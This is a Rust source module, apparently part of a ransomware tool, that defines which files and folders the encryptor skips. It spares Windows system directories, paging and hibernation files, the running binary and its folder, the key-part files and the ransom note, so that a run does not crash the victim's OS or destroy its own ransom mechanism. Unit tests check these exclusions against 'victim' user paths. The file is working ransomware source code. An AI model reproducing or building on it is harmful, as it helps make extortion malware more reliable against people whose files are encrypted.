//! Self-preservation exclusions — always on (no feature flag).
//!
//! Paths and file names that must never be encrypted, so a run can't brick the
//! OS (Windows system dirs, paging/hibernation files) or encrypt its own
//! artifacts (the running binary, its folder, the key blobs, the ransom note).

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

/// File names (compared case-insensitively) that are never encrypted.
fn preserved_file_names() -> &'static HashSet<String> {
    static NAMES: OnceLock<HashSet<String>> = OnceLock::new();
    NAMES.get_or_init(|| {
        [
            "key.part1",
            "key.part2",
            "decryption.key",
            "read_me.txt",
            "pagefile.sys",
            "hiberfil.sys",
            "swapfile.sys",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    })
}

/// Windows directory names (lowercase) the walk must not descend into.
/// Matches the `priority-scan` prune list so both modes behave the same.
#[cfg(windows)]
const SYSTEM_DIR_NAMES: &[&str] = &[
    "windows",
    "winnt",
    "program files",
    "program files (x86)",
    "programdata",
    "$recycle.bin",
    "system volume information",
];

/// The directory the binary is running from, if it can be determined.
fn run_folder() -> &'static Option<PathBuf> {
    static FOLDER: OnceLock<Option<PathBuf>> = OnceLock::new();
    FOLDER.get_or_init(|| {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
    })
}

fn running_exe() -> &'static Option<PathBuf> {
    static EXE: OnceLock<Option<PathBuf>> = OnceLock::new();
    EXE.get_or_init(|| std::env::current_exe().ok())
}

fn file_name_lower(path: &Path) -> Option<String> {
    path.file_name().map(|n| n.to_string_lossy().to_lowercase())
}

/// True when a directory entry should not be descended into during a walk.
///
/// Only the directory's own name is checked (not every ancestor): the walk
/// prunes at the boundary, so children are never visited. Checking the whole
/// chain per directory would add a component scan to every entry in the tree.
pub fn is_pruned_dir(dir: &Path) -> bool {
    if let Some(folder) = run_folder() {
        if dir.starts_with(folder) {
            return true;
        }
    }
    #[cfg(windows)]
    {
        if let Some(name) = file_name_lower(dir) {
            if SYSTEM_DIR_NAMES.contains(&name.as_str()) {
                return true;
            }
        }
    }
    false
}

/// True when a file entry must never be encrypted.
pub fn is_preserved_file(path: &Path) -> bool {
    if let Some(exe) = running_exe() {
        if path == exe {
            return true;
        }
    }
    if let Some(folder) = run_folder() {
        if path.starts_with(folder) {
            return true;
        }
    }
    if let Some(name) = file_name_lower(path) {
        if preserved_file_names().contains(&name) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn preserved_file_names_are_excluded_anywhere() {
        for name in [
            "key.part1",
            "key.part2",
            "decryption.key",
            "read_me.txt",
            "pagefile.sys",
            "hiberfil.sys",
            "swapfile.sys",
        ] {
            assert!(is_preserved_file(Path::new(name)), "{name} should be preserved");
            let nested = format!("C:/Users/victim/Desktop/{name}");
            assert!(is_preserved_file(Path::new(&nested)), "{nested} should be preserved");
        }
    }

    #[test]
    fn preserved_file_names_are_case_insensitive() {
        assert!(is_preserved_file(Path::new("KEY.PART1")));
        assert!(is_preserved_file(Path::new("Read_Me.TXT")));
        assert!(is_preserved_file(Path::new("PageFile.sys")));
    }

    #[test]
    fn normal_files_are_not_preserved() {
        assert!(!is_preserved_file(Path::new("report.docx")));
        assert!(!is_preserved_file(Path::new("C:/Users/victim/Documents/plan.pdf")));
        assert!(!is_preserved_file(Path::new("C:/Users/victim/Documents/readme.txt")));
    }

    #[cfg(windows)]
    #[test]
    fn windows_system_dirs_are_pruned() {
        for dir in [
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData",
            "C:\\$Recycle.Bin",
            "D:\\System Volume Information",
        ] {
            assert!(is_pruned_dir(Path::new(dir)), "{dir} should be pruned");
        }
    }

    #[cfg(windows)]
    #[test]
    fn normal_dirs_are_not_pruned() {
        assert!(!is_pruned_dir(Path::new("C:\\Users\\victim")));
        assert!(!is_pruned_dir(Path::new("C:\\Users\\victim\\Documents")));
    }
}
